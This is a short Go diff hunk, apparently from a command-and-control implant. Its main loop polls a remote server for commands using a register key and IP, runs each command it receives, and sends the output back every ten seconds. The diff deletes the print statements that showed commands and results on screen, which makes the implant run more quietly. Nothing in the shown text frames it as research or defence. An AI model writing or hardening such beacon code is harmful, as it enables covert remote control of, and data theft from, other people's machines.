@@ -253,14 +253,11 @@ func main() {
 		command := fetchCommand(registerkey, ip)
 
 		if strings.Contains(command, "[-]") == true {
-			fmt.Println("[-] Sleeping... ")
 			time.Sleep(10 * time.Second)
 			continue
 		}
 
-		fmt.Println("Command: ", command)
 		execute_result := executeCommand(command)
-		fmt.Println("[+] Result: ", execute_result)
 		submitResult(registerkey, ip, execute_result)
 
 		time.Sleep(10 * time.Second)
